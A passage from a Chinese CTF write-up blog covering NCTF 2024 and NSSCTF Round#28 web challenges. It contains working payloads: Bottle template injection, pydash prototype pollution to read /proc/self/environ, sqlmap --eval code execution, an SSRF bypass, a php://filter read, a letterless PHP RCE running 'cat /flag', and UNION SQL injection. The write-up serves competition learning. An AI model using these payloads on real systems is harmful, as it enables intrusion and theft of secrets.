<span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>看前面的黑名单，预期解应该是打<a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">pydash原型链污染</a>，但是没能参考上</p><p>非预期，打<code>Bottle模板注入</code>，上周<code>GHCTF2025</code>刚打过一次，但是过滤了<code>&#123;&#125;.</code>，可以绕一下<code>os.system()</code><br><code>%</code>开始可以<strong>嵌入python代码执行</strong>，<code>&lt;%xxx%&gt;</code>是嵌入代码块，因为页面没有回显需要重定向，然后文件包含读取(一开始犯病了，想访问<code>/render/1</code>，应该是没有读取权限？然后才想起了<code>include</code>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/render?path=%getattr(__import__(<span class="string">&#x27;os&#x27;</span>), <span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;env &gt; 1&#x27;</span>)</span><br><span class="line">/render?path=%include(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里也可以通过<code>/render</code>路由<strong>渲染当前路径下的文件</strong>，<code>?path=1</code></p><p>赛后再来学一下怎么实现<strong>原型链污染</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>这里修复了非预期，为了深入学习一下，参考<a href="https://err0r233.github.io/posts/32411.html">深大爷Err0r233</a><br>我们本地是有下载<code>bottle</code>的，可以在<code>vscode</code>试着跟进源码看看<code>bottle</code>是怎么实现渲染的</p><p>具体原理得细读师傅的文章，这里直接提炼一下</p><p><code>bottle.template</code>可以实现模板文件渲染，<code>template</code>的第一个参数<code>tpl</code>，如果含有<code>\n、&#123;、%、$</code>的能够加入<code>TEMPLATES[tplid]</code>，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而它会根据<code>TEMPLATE_PATH</code>里去找到<br><code>lookup = kwargs.pop(&#39;template_lookup&#39;, TEMPLATE_PATH</code></p><p>这里因为过滤了<code>&#123;&#125;</code>，无法直接渲染，我们只能通过污染<code>TEMPLATE_PATH</code>实现任意文件读</p><p><code>pydash.set_(obj,path,value)</code>是可以<strong>修改对象属性</strong>的</p><p>污染的效果是这样<code>setval.__globals__.bottle.TEMPLATE=[&#39;/proc/self&#39;]</code></p><p>官方这样解释的<code>pydash不允许去修改__globals__属性</code></p><p><code>pydash</code>的版本是<code>8.0.5</code>(也可以通过非预期看一手)，因此不能够直接通过<code>__globals__</code>去获得<code>bottle</code>，在<code>pydash 5.1.2</code>版本中能够使用<code>__globals__</code>，但是高版本下已经被修复了，现在会报<code>access to restricted key __globals__</code>，因此要想办法绕过<code>restricted key</code></p><p>可以发现该异常只有输入在<code>RESTRICTED_KEYS</code><strong>中的内容</strong>时才会触发：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pydash.helpper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)</code></p><p>所以，可以通过<code>pydash</code>自己污染掉<code>RESTRICTED_KEYS</code>从而使用<code>globals</code>(这里是因为污染为空，就没有不允许修改<code>__globals__</code>的属性的限制了，之后就可以<strong>自己修改</strong><code>__globals__</code>的属性了)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=pydash</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后再污染<code>TEMPLATE_PATH</code>为<code>/proc/self</code>，我们即可通过<code>/render?path=environ</code>将环境变量渲染出来了</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=setval</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/proc/self&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.16.204:20055/&quot;</span></span><br><span class="line">a1 = requests.post(url+<span class="string">&quot;setValue?name=pydash&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span>, <span class="string">&quot;value&quot;</span>: []&#125;)</span><br><span class="line"></span><br><span class="line">a2 = requests.post(url+<span class="string">&quot;setValue?name=setval&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span>, <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/proc/self&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">a3 = requests.get(url+<span class="string">&quot;render?path=environ&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a3.text)</span><br></pre></td></tr></table></figure><h2 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p>关键在</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><strong>shell=True参数会让subprocess.call接受字符串类型的变量作为命令，并调用shell去执行这个字符串，当shell=False是，subprocess.call只接受数组变量作为命令，并将数组的第一个元素作为命令，剩下的全部作为该命令的参数</strong></p><p>所以这里不能拼接命令执行了，<code>command.split()</code>，只能利用<code>sqlmap</code>的参数<br><code>compose.yml</code>告诉我们<code>flag</code>在<strong>环境变量</strong>里面<code>FLAG</code></p><p>emmmm，对<code>sqlmap</code>的参数不太了解，<code>--file-read</code>这些都不行<br>说实话，命令有点多，没翻到<code>--eval</code></p><p>比赛结束后，找到一篇<a href="https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/#sqlmap-master">wp</a>学习一下<br>主要用到了两个参数，还要绕空格(不然参数会被分割)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">eval</span>：动态运行任意的 Python 代码</span><br><span class="line">-c CONFIGFILE：从ini文件中加载选项</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">--eval eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;echo$IFS$FLAG&gt;&gt;114514&#x27;)&quot;)</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>c <span class="number">114514</span></span><br></pre></td></tr></table></figure><p>说实话，真不了解，不愧是<strong>sqlmap-master</strong></p><p>那既然如此，<code>-c</code>能把文件带出来，我们为什么不直接读环境变量呢<br><code>127.0.0.1 -c /proc/self/environ</code></p><p>诶，看了一下出题人的<a href="https://exp10it.io/2025/03/nctf-2024-web-writeup/">wp</a>，这道题很明显是有回显的啊，可以直接执行<code>env</code><br><code>127.0.0.1 --eval __import__(&#39;os&#39;).system(&#39;env&#39;)</code></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="QRcode-Reconstruction"><a href="#QRcode-Reconstruction" class="headerlink" title="QRcode Reconstruction"></a>QRcode Reconstruction</h2><p>经典二维码修复<br><img src="https://pic1.zhimg.com/80/v2-e3dce2dc4b1481a7641ed85532c6c157_1440w.png" alt=""><br>先自己涂上，然后把全部的纠错码擦掉<br><img src="https://pica.zhimg.com/80/v2-04ba7358595be0e373b888bf579b4a6a_1440w.png" alt=""><br>选择<br><img src="https://pica.zhimg.com/80/v2-d50339b7af09d24516fb9fb6847b5afc_1440w.png" alt=""><br>然后开始<strong>嗯猜flag</strong><br><img src="https://pica.zhimg.com/80/v2-7067f81c3451be3b59ff1c4c518d640a_1440w.png" alt=""><br><strong>NCTF{WeLc0mE_t0_Nctf_2024!!!}</strong><br>直接一把出</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign()"></a>Sign()</h2><blockquote><p>这是恢复互联网的密钥，密码是实时生成的三万个随机数。</p></blockquote><p>emmmmm，这密码真难看</p><p><a href="https://crystaljiang232.github.io/nctf2024/">一部分官方wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;放在最前面，&lt;a href=&quot;https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh&quot;&gt;laogong的wp&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF Round#28 &amp;&amp; 2025红明谷杯初赛 WriteUps</title>
    <link href="https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <id>https://hvang10.github.io/2025/03/22/NSSCTF-round28-2025%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%88%9D%E8%B5%9B/</id>
    <published>2025-03-22T08:57:18.000Z</published>
    <updated>2025-03-24T10:02:56.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-Round-28"><a href="#NSSCTF-Round-28" class="headerlink" title="NSSCTF Round#28"></a>NSSCTF Round#28</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag在/flag路由中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only http:// URLs are allowed&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$forbidden_ips</span> = [<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ip</span>, <span class="variable">$forbidden_ips</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Access to localhost or 127.0.0.1 is forbidden&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please provide a &#x27;url&#x27; parameter&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接绕过<strong>127.0.0.1</strong>的解析，<code>?url=http://0.0.0.0/flag</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0(缺省路由的写法也可以代表0.0.0.0) 0.0.0.0 都代表本地</span><br><span class="line">127.x.x.x 除了.1都行，都是环回地址</span><br></pre></td></tr></table></figure><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;password can&#x27;t be a number&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="variable">$password</span> != <span class="number">123456</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong password&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wonderful&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);   <span class="comment"># level2.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>%00</code>进行截断，强比较网上随便找例子或者<code>fastcoll</code>生成，<code>level2.php</code>源码不高亮，得通过<strong>伪协议</strong>读出来(那这里是不是可以直接读<code>flag</code>)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;php://filter/convert.base64-encode/resource=/var/www/html/level2.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/?password=123456%00&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># level2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$rce</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$rce</span>) &lt;= <span class="number">120</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\]/&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$rce</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;Are you hack me?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;I want string!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too long!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拿正则匹配的东西去搜，可以找到，参考<a href="https://exp10it.io/2022/10/2022-hnctf-web-writeup/#challenge__rce">原题</a>构造</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">data = &#123;<span class="string">&#x27;rce&#x27;</span>: <span class="string">&#x27;$_=([].¥)&#123;3&#125;;$_++;$_.=++$_;$_++;$_++;$_++; $_++;$_++;$_.=([].¥)&#123;2&#125;;$_=_.$_(71).$_(69).$_(84);($$_&#123;0&#125;)($$_&#123;1&#125;);&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">url = <span class="string">&quot;http://node3.anna.nssctf.cn:28816/level2.php?0=system&amp;1=cat /flag&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="light-pink"><a href="#light-pink" class="headerlink" title="light_pink"></a>light_pink</h3><p>试出了，用单引号进行闭合(字符型注入)，<code>order by</code>查询列数，发现数据库错误，那就试着把注释带上(这是个好习惯)，不可以用<code>-</code>，用<code>#</code>也不行，换<code>%23</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 5%23 查到列数为5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span><span class="operator">%</span><span class="number">23</span>    联合注入中需要id为不存在的数才能把<span class="keyword">union</span>查询的内容回显，得到nss_board</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like &#x27;</span>nss_board<span class="string">&#x27;%23   这里过滤了等号，用like绕过即可，得到Cute,messages</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(column_name),<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="keyword">like</span> <span class="string">&#x27;Cute&#x27;</span><span class="operator">%</span><span class="number">23</span>    得到id,Happy，另外一个是id,username,title,content,created_at</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(Happy),5 from Cute%23</span></span><br></pre></td></tr></table></figure><p>说实话<code>sqlmap</code>好像梭不出来()，还有人把数据库扫出来了</p><h3 id="Coding-Loving"><a href="#Coding-Loving" class="headerlink" title="Coding Loving"></a>Coding Loving</h3><p><strong>Code Audit</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span>]</span><br><span class="line">TIME_LIMIT = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;coding&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, command=command)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> 